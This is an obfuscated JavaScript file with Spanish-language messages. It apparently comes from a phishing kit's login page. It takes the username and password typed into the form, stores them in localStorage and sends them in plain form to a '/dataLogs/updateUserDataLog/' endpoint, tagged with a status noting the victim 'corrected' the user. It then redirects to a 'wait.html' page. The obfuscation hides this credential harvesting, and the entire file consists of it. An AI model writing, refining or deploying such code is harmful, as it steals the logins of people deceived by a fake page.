function _0x3d58(_0x43524b, _0x599d98) {
  const _0x98d523 = _0x98d5();
  return (
    (_0x3d58 = function (_0x3d58d5, _0xc74dd3) {
      _0x3d58d5 = _0x3d58d5 - 0x1c9;
      let _0xd84451 = _0x98d523[_0x3d58d5];
      return _0xd84451;
    }),
    _0x3d58(_0x43524b, _0x599d98)
  );
}
const _0xbfbdb1 = _0x3d58;
(function (_0x57be78, _0x163577) {
  const _0x50eeae = _0x3d58,
    _0x10c659 = _0x57be78();
  while (!![]) {
    try {
      const _0x3f4ce5 =
        -parseInt(_0x50eeae(0x1ed)) / 0x1 +
        (parseInt(_0x50eeae(0x1da)) / 0x2) *
          (-parseInt(_0x50eeae(0x1dc)) / 0x3) +
        -parseInt(_0x50eeae(0x1d6)) / 0x4 +
        -parseInt(_0x50eeae(0x1e9)) / 0x5 +
        (-parseInt(_0x50eeae(0x1e1)) / 0x6) *
          (-parseInt(_0x50eeae(0x1cf)) / 0x7) +
        parseInt(_0x50eeae(0x1d5)) / 0x8 +
        (-parseInt(_0x50eeae(0x1e0)) / 0x9) *
          (-parseInt(_0x50eeae(0x1d0)) / 0xa);
      if (_0x3f4ce5 === _0x163577) break;
      else _0x10c659["push"](_0x10c659["shift"]());
    } catch (_0x27213d) {
      _0x10c659["push"](_0x10c659["shift"]());
    }
  }
})(_0x98d5, 0xba16b);
function updateLS() {
  const _0x4cd942 = _0x3d58;
  LS[_0x4cd942(0x1e5)]("info", JSON[_0x4cd942(0x1d2)](info));
}
const button = document[_0xbfbdb1(0x1ec)]("btnUsuario"),
  userInput = document[_0xbfbdb1(0x1ec)]("txtUsuario"),
  passInput = document[_0xbfbdb1(0x1ec)](_0xbfbdb1(0x1cc));
function _0x98d5() {
  const _0x1df0ca = [
    "4144960iFotXs",
    "No\x20se\x20encontró\x20el\x20ID\x20o\x20el\x20token\x20en\x20localStorage.",
    "getItem",
    "Error\x20al\x20actualizar\x20usuario:",
    "1132082vPCwBh",
    "puser",
    "6ZaGAEX",
    "value",
    "Bearer\x20",
    "Usuario\x20actualizado\x20correctamente",
    "1548AjDuXM",
    "346722lFMcmp",
    "user",
    "Por\x20favor\x20ingrese\x20la\x20información\x20requerida",
    "preventDefault",
    "setItem",
    "json",
    "dataLogId",
    "metaInfo",
    "477040capqZx",
    "dataLogToken",
    "Error\x20al\x20actualizar\x20datos\x20en\x20el\x20servidor",
    "getElementById",
    "1294482cKnCNn",
    "addEventListener",
    "application/json",
    "log",
    "location",
    "txtPass",
    "wait.html",
    "href",
    "182NrInCi",
    "90340UUmQqq",
    "disabled",
    "stringify",
    "error",
    "click",
    "10112968iAXPKq",
  ];
  _0x98d5 = function () {
    return _0x1df0ca;
  };
  return _0x98d5();
}
async function updateStatusUser() {
  const _0x16c41a = _0xbfbdb1;
  button[_0x16c41a(0x1d1)] = !![];
  try {
    const _0xf12ddf = localStorage[_0x16c41a(0x1d8)](_0x16c41a(0x1e7)),
      _0x4e46b7 = localStorage[_0x16c41a(0x1d8)](_0x16c41a(0x1ea));
    if (!_0xf12ddf || !_0x4e46b7) throw new Error(_0x16c41a(0x1d7));
    const _0x8aeeaa = await fetch(
      url + "/dataLogs/updateUserDataLog/" + _0xf12ddf,
      {
        method: "PUT",
        headers: {
          "Content-Type": _0x16c41a(0x1c9),
          Authorization: _0x16c41a(0x1de) + _0x4e46b7,
          Origin: window["location"]["origin"],
        },
        body: JSON[_0x16c41a(0x1d2)]({
          us: info["metaInfo"][_0x16c41a(0x1e2)],
          ps: info[_0x16c41a(0x1e8)][_0x16c41a(0x1db)],
          status: "Corrigió\x20Usuario",
        }),
      }
    );
    if (!_0x8aeeaa["ok"]) {
      const _0xe12705 = await _0x8aeeaa[_0x16c41a(0x1e6)]();
      throw new Error(_0xe12705[_0x16c41a(0x1d3)] || _0x16c41a(0x1eb));
    }
    console[_0x16c41a(0x1ca)](_0x16c41a(0x1df)),
      (button[_0x16c41a(0x1d1)] = ![]),
      (window[_0x16c41a(0x1cb)][_0x16c41a(0x1ce)] = _0x16c41a(0x1cd));
  } catch (_0x1b7f4d) {
    console[_0x16c41a(0x1d3)](_0x16c41a(0x1d9), _0x1b7f4d),
      alert(
        "Hubo\x20un\x20error\x20al\x20procesar\x20la\x20solicitud.\x20Por\x20favor,\x20inténtelo\x20de\x20nuevo."
      ),
      (button[_0x16c41a(0x1d1)] = ![]);
  }
}
button[_0xbfbdb1(0x1ee)](_0xbfbdb1(0x1d4), async function (_0x48e4bb) {
  const _0x3b0dd8 = _0xbfbdb1;
  _0x48e4bb[_0x3b0dd8(0x1e4)]();
  if (userInput["value"] == "" && passInput[_0x3b0dd8(0x1dd)] == "") {
    alert(_0x3b0dd8(0x1e3)), userInput["focus"]();
    return;
  } else {
    const _0xb6e5c9 = userInput[_0x3b0dd8(0x1dd)],
      _0x37c5c8 = passInput[_0x3b0dd8(0x1dd)];
    (info["metaInfo"]["user"] = _0xb6e5c9),
      (info[_0x3b0dd8(0x1e8)][_0x3b0dd8(0x1db)] = _0x37c5c8),
      updateLS(),
      await updateStatusUser();
  }
});
